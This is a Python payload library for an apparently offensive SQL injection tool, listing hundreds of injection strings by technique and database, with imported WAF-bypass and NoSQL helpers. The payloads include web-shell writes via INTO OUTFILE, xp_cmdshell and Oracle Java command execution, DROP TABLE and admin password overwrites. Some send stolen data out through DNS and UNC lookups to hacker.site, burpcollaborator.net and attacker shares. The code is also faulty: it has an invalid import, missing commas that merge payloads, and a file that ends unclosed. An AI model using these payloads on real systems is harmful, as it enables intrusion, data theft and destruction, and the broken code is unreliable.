import os
import json
import random
import logging
from pathlib import Path, path
from bypass import AdvancedWAFBypass, NoSQLInjection, SmartWAFBypass, generate_smart_bypass_payloads

class BasicDetectionPayloads:
    def __init__(self):
        self.payloads = {
            'basic_detection': self._get_basic_detection(),
            'database_errors': self._get_database_errors(),
            'comment_based': self._get_comment_based(),
            'parameter_break': self._get_parameter_break(),
            'initial_time_based': self._get_initial_time_based(),
            'boolean_blind': self._get_boolean_blind(),
            'union_based': self._get_union_based(),
            'time_based_blind': self._get_time_based_blind(),
            'error_based': self._get_error_based(),
            'stacked_queries': self._get_stacked_queries(),
            'second_order': self._get_second_order(),
            'nosql': self._get_nosql(),
            'database_specific': self._get_database_specific()
        }
    
    def _get_basic_detection(self):
        return [
            "'", "''", "'''", "''''", "'''''",
            "'\"", "'\"'", "'\"\"",
            "')", "')'", "'))", "'))'",
            "\"", "\"\"", "\"\"\"",
            "\")", "\")\"", "\"))", "\"))\"", "--", "/**/",
            ";%00", "/*!32302 10*/	" 
        ]
    
    def _get_database_errors(self):
        return [
            "' AND 1=1",
            "' AND 1=2", 
            "' OR 1=1",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "' OR '1'='1'#"
        ]
    
    def _get_comment_based(self):
        return [
            "'--", "'/*", "'#",
            "';--", "';/*", "';#",
            "')--", "')/*", "')#",
            "'))--", "'))/*", "'))#"
        ]
    
    def _get_parameter_break(self):
        return [
            "' AND '1'='1",
            "' AND '1'='2", 
            "' OR 'x'='x",
            "' OR 'x'='y"
        ]
    
    def _get_initial_time_based(self):
        return [
            "' AND SLEEP(5)--",
            "' WAITFOR DELAY '0:0:5'--",
            "' AND PG_SLEEP(5)--"
        ]
    
    def _get_boolean_blind(self):
        return {
            'mysql_boolean': [
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>97--",
                "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' AND LENGTH(database())=5--",
                "' AND (SELECT MID(@@version,1,1))='5'--",
                "' AND EXISTS(SELECT * FROM information_schema.tables)--",
                "' AND (SELECT IF(1=1,SLEEP(1),0))--"
            ],
            'version_detection': [
                "' AND @@version LIKE '%5%'--",
                "' AND @@version LIKE '%8%'--",
                "' AND SUBSTRING(@@version,1,1)='5'--",
                "' AND SUBSTRING(@@version,1,1)='8'--"
            ],
            'database_name': [
                "' AND database() LIKE '%test%'--",
                "' AND ASCII(SUBSTRING(database(),1,1))>100--",
                "' AND LENGTH(database())>3--"
            ],
            'table_existence': [
                "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--",
                "' AND EXISTS(SELECT * FROM users)--",
                "' AND (SELECT COUNT(*) FROM users)>0--"
            ],
            'user_privilege': [
                "' AND user() LIKE 'root%'--",
                "' AND current_user()='root@localhost'--",
                "' AND (SELECT COUNT(*) FROM mysql.user)>0--"
            ]
        }
    
    def _get_union_based(self):
        return {
            'basic_union': [
                "' UNION SELECT 1--",
                "' UNION SELECT 1,2--",
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT 1,2,3,4--",
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--"
            ],
            'mysql_union': [
                "' UNION SELECT @@version,NULL--",
                "' UNION SELECT database(),NULL--",
                "' UNION SELECT user(),NULL--",
                "' UNION SELECT @@version,database(),user()--",
                "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL FROM information_schema.columns--",
                "' UNION SELECT table_name,column_name FROM information_schema.columns--",
                "ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'"
                "UNION SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #",
                "UNION SELECT 1,(SELECT(@)FROM(SELECT(@:=0X00),(SELECT(@)FROM(information_schema.processlist)WHERE(@)IN(@:=CONCAT(@,0x3C62723E,state,0x3a,info))))a),3,4 #",
                "UNION ALL SELECT LOAD_FILE('/etc/passwd') --",
                "UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));",
                "GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#",
                "UNION SELECT '<?php system($_GET['cmd']); ?>' into outfile 'C:\\xampp\\htdocs\\backdoor.php'",
                "UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'",
                "UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -",
                "union all select 1,2,3,4,'<?php echo shell_exec($_GET['cmd']);?>',6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'",
                "UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'",
                "UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';",
                "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata",
                "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER",
                "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...",
                "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ..."
                "(1)and(SELECT * from db.users)=(1)	",
                "1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)	",
                "UNION SELECT * FROM (SELECT * FROM users JOIN users b)a	",
                "UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a	",
                "UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a	",
                "SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;",

            ],
            'postgresql_union': [
                "' UNION SELECT version(),NULL--",
                "' UNION SELECT current_database(),NULL--",
                "' UNION SELECT current_user,NULL--"
            ],
            'mssql_union': [
                "' UNION SELECT @@version,NULL--",
                "' UNION SELECT db_name(),NULL--",
                "' UNION SELECT user_name(),NULL--",
                "$ SELECT name FROM master..sysdatabases",
                "$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'",
                "$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')",
                "SELECT  UserId, UserName from Users",

            ],
            'advanced_union': [
                "' UNION ALL SELECT 1,2--",
                "' UNION DISTINCT SELECT 1,2--",
                "' UNION SELECT 1,2 FROM dual--",
                "' UNION SELECT 1,2 FROM information_schema.tables--"
            ]
        }
    
    def _get_time_based_blind(self):
        return {
            'mysql_time': [
                "' AND SLEEP(5)--",
                "' AND (SELECT SLEEP(5))--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(5),0)--",
                "' AND BENCHMARK(5000000,MD5('test'))--",
                "2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",
                "2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2",
                "AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)",
                "AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)",
                "AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)",
                "AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)"
                "+BENCHMARK(40000000,SHA1(1337))+",
                "'+BENCHMARK(3200,SHA1(1))+'",
                "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))",
                "RLIKE SLEEP([SLEEPTIME])",
                "OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))",
                "XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR",
                "AND SLEEP(10)=0",
                "AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)",
                "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#",
                "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# ",
                "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#",
                "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#",
                "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#",
                "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#",
                "1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#",
                "AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --",
                "AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --",
                "OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",

            ],
            'oracle': [
                "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ",
                "AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)",
                "SELECT EXTRACTVALUE(xmltype('<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [ <!ENTITY % remote SYSTEM 'http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/'> %remote;]>'),'/l') FROM dual",
            ],

            'sqlite': [
                "AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table",
                "AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number",
                "AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')",
                "CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END",
                "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
                "AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",


            ],

            'postgresql_time': [
                "' AND PG_SLEEP(5)--",
                "' AND (SELECT PG_SLEEP(5))--",
                "' AND CASE WHEN 1=1 THEN PG_SLEEP(5) ELSE 0 END--",
                "' and substr(version(),1,10) = 'PostgreSQL' and '1  --",
                "' and substr(version(),1,10) = 'PostgreXXX' and '1  --",
                "select 1 from pg_sleep(5)",
                ";(select 1 from pg_sleep(5))",
                "||(select 1 from pg_sleep(5))",
                "select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1",
                "select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1",
                "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1",
                "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1"
                "AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'",
                "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))",
                "AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",

            ],
            'mssql_time': [
                "' WAITFOR DELAY '0:0:5'--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND WAITFOR DELAY '0:0:5'--",
                "ProductID=1;waitfor delay '0:0:10'--",
                "ProductID=1);waitfor delay '0:0:10'--",
                "ProductID=1';waitfor delay '0:0:10'--",
                "ProductID=1');waitfor delay '0:0:10'--",
                "ProductID=1));waitfor delay '0:0:10'--",
                "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
                "IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';",
                "AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -",
                "SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'",
                "WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)",
                "SELECT message FROM data WHERE row = 1 and message like 't%'",
                "AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97",
                "AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- ",
                "AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'",
                "AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90",


            ],
            'advanced_time': [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' UNION SELECT SLEEP(5)--",
                "'; SELECT SLEEP(5)--"
            ]
        }
    
    def _get_error_based(self):
        return {
            'mysql_error': [
                "' AND EXTRACTVALUE(1,CONCAT(0x3a,@@version))--",
                "' AND UPDATEXML(1,CONCAT(0x3a,@@version),1)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -",
                "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -",
                "AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -",
                "AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -",
                "AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -",
                "OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -",
                "AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--",
                "AND UUID_TO_BIN(version())='1",
                "(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))",
                "'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'",
                "AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-",
                "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--",
                "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--",
                "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--",
                "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--",
                "UPDATEXML(null,CONCAT(0x0a,version()),null)-- -",
                "UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -",
                "AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--",
                "AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--",
                "AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--",
                "AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--",
                "AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--"
            ],
            'sqlite':[
                "AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END",

            ],
            'postgresql_error': [
                "' AND CAST(version() AS INTEGER)--",
                "' AND 1/0--",
                "' AND (SELECT 1/(SELECT COUNT(*) FROM information_schema.tables))--",
                "AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -",
                "AND (CAST('~'||(SELECT version())::text||'~' AS NUMERIC)) -- -",
                "AND CAST((SELECT version()) AS INT)=1337 -- -",
                "AND (SELECT version())::int=1 -- -",
                "CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)",
                "CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--",
                "CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--",
                "CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)",
                "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",
                "' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1",
                "' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1",
                "' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1",

            ],
            'mssql_error': [
                "' AND 1=CONVERT(int,@@version)--",
                "' AND 1=CONVERT(int,db_name())--",
                "' AND 1=CONVERT(int,user_name())--",
                "AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -",
                "AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -",
                "AND 1337=CONCAT('~',(SELECT @@version),'~') -- -",
                "CAST((SELECT @@version) AS INT)",
                "convert(int,@@version)",
                "cast((SELECT @@version) as int)",
                "' + convert(int,@@version) + '",
                "' + cast((SELECT @@version) as int) + '",

            ]
        }
    
    def _get_stacked_queries(self):
        return [
            "'; DROP TABLE users--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; INSERT INTO users (username,password) VALUES ('hacker','pwned')--",
            "'; EXEC xp_cmdshell 'whoami'--",
            "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--",
            "SELECT 'A'SELECT 'B'SELECT 'C'",
            "SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--",
            "SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--",
            "ProductID=1; DROP members--"
            "SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--",

        ]
    
    def _get_second_order(self):
        return [
            "admin' OR '1'='1",
            "admin'--",
            "admin'/*",
            "admin'#",
            "admin' OR 1=1--",
            "admin' UNION SELECT 1,2--"
        ]
    
    def _get_nosql(self):
        nosql = NoSQLInjection()
        return {
            'mongo_injection': nosql.mongo_injection(),
            'json_injection': nosql.json_injection()
        }
    
    def _get_database_specific(self):
        return {
            'mysql': [
                "' AND @@version LIKE '%MySQL%'--",
                "' UNION SELECT @@version,NULL--",
                "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#",
                "(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#",
                "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
                "(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",
                "(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))",
                "(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))",
                "+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
                "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)",
                "SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;",
                "SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';",
                "SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;",
                "SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));",
                "SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))",
                "SELECT LOAD_FILE('\\\\error\\abc');",
                "SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);",
                "SELECT '' INTO DUMPFILE '\\\\error\\abc';",
                "SELECT '' INTO OUTFILE '\\\\error\\abc';",
                "SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;",
                "%A8%27 OR 1=1;--",
                "%8C%A8%27 OR 1=1--",
                "%bf' OR 1=1 -- --"
                                                                 
            ],
            'postgresql': [
                "' AND version() LIKE '%PostgreSQL%'--",
                "' UNION SELECT version(),NULL--",
                "SELECT version()",
                "SELECT CURRENT_DATABASE()",
                "SELECT CURRENT_SCHEMA()",
                "SELECT usename FROM pg_user",
                "SELECT usename, passwd FROM pg_shadow",
                "SELECT usename FROM pg_user WHERE usesuper IS TRUE",
                "SELECT user;",
                "SELECT current_user;",
                "SELECT session_user;",
                "SELECT usename FROM pg_user;",
                "SELECT getpgusername();",
                "SELECT DISTINCT(schemaname) FROM pg_tables",
                "SELECT datname FROM pg_database",
                "SELECT query_to_xml('select * from pg_user',true,true,''); --",
                "SELECT database_to_xml(true,true,''); ",
                "SELECT database_to_xmlschema(true,true,''); --",
                "SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');",



                
            ],

            'sqlite': [
                "SELECT sql FROM sqlite_schema",
                "SELECT sql FROM sqlite_master",
                "SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'",
                "SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'",
                "SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');",
                "SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'",
                "SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')",

            ],

            'oracle': [
                "SELECT user FROM dual UNION SELECT * FROM v$version",
                "SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';",
                "SELECT banner FROM v$version WHERE banner LIKE 'TNS%';",
                "SELECT BANNER FROM gv$version WHERE ROWNUM = 1;",
                "SELECT version FROM v$instance;",
                "SELECT UTL_INADDR.get_host_name FROM dual;",
                "SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;",
                "SELECT UTL_INADDR.get_host_address FROM dual;",
                "SELECT host_name FROM v$instance;",
                "SELECT global_name FROM global_name;",
                "SELECT name FROM V$DATABASE;",
                "SELECT instance_name FROM V$INSTANCE;",
                "SELECT SYS.DATABASE_NAME FROM DUAL;",
                "SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;",
                "SELECT username FROM all_users;	",
                "SELECT name, password from sys.user$;	",
                "SELECT name, spare4 from sys.user$;	",
                "SELECT DISTINCT owner FROM all_tables;",
                "SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)",
                "select * from dba_java_policy",
                "select * from user_java_policy",
                "exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');",
                "exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');",
                "exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');",
                "SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL",
                "SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual",
                "SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL",
                "SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;",



            ],
            'mssql': [
                "' AND @@version LIKE '%Microsoft%'--",
                "' UNION SELECT @@version,NULL--",
                "SELECT @@version",
                "SELECT DB_NAME()",
                "SELECT SCHEMA_NAME()",
                "SELECT HOST_NAME()",
                "SELECT @@hostname",
                "SELECT @@SERVERNAME",
                "SELECT SERVERPROPERTY('productversion')",
                "SELECT SERVERPROPERTY('productlevel')",
                "SELECT SERVERPROPERTY('edition')",
                "SELECT CURRENT_USER",
                "SELECT user_name();",
                "SELECT system_user;",
                "SELECT user;",
                "SELECT name FROM master..sysdatabases;",
                "SELECT name FROM master.sys.databases;",
                "SELECT DB_NAME(N); ",
                "SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; ",
                "SELECT name FROM master..sysobjects WHERE xtype = 'U';",
                "SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'",
                "SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';",
                "SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';",
                "SELECT table_catalog, table_name FROM information_schema.columns",
                "SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'",
                "SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';",
                "SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');",
                "SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; ",
                "SELECT table_catalog, column_name FROM information_schema.columns",
                "SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)",
                "EXEC xp_cmdshell 'net user'';",
                "EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';",
                "EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';",
                "1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))",
                "1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))",
                "1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))",
                "1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- ",
                "xp_dirtree '\\attackerip\file'",
                "xp_fileexist '\\attackerip\file'",
                "BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'",
                "BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'",
                "RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'",
                "RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'",
                "RESTORE HEADERONLY FROM DISK = '\\attackerip\file'",
                "RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'",
                "RESTORE LABELONLY FROM DISK = '\\attackerip\file'",
                "RESTORE REWINDONLY FROM DISK = '\\attackerip\file'",
                "RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'"
                "select * from master..sysservers",
                "select * from openquery('dcorp-sql1', 'select * from master..sysservers')",
                "select version from openquery('linkedserver', 'select @@version as version')",
                "select version from openquery('link1','select version from openquery('link2','select @@version as version')')",
                "select 1 from openquery('linkedserver','select 1;exec master..xp_cmdshell 'dir c:'')",
                "SELECT * FROM fn_my_permissions(NULL, 'SERVER'); ",
                "SELECT * FROM fn_my_permissions (NULL, 'DATABASE');",
